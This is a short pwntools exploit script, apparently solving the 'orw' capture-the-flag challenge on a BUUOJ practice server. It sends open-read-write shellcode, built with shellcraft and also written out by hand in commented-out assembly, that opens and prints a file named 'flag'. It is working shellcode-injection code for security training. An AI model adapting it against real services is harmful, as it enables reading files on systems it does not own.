from pwn import *

context.log_level = "debug"

sh = shellcraft.pushstr("flag")
sh += shellcraft.syscall("SYS_open", "esp", 0)
sh += shellcraft.syscall("SYS_read", "eax", "esp", 0x50)
sh += shellcraft.syscall("SYS_write", 1, "esp", 0x50)
sh = asm(sh)

# mopen = """
# mov eax,5;
# xor ecx,ecx;
# xor edx,edx;
# push 0;
# push 0x67616C66;
# mov ebx,esp;
# int 0x80;
# """

# mread = """
# mov ecx,ebx;
# mov ebx,eax;
# mov eax,3;
# mov edx,0x50;
# int 0x80;
# """

# mwrite = """
# mov eax,4;
# mov ebx,1;
# mov edx,0x50;
# int 0x80;
# """


# sh = asm(mopen) + asm(mread) + asm(mwrite)
r = remote("node4.buuoj.cn", 26609)
r.recvuntil(b":")
r.sendline(sh)
r.interactive()
# http://liul14n.top/2020/05/19/Pwnable-orw/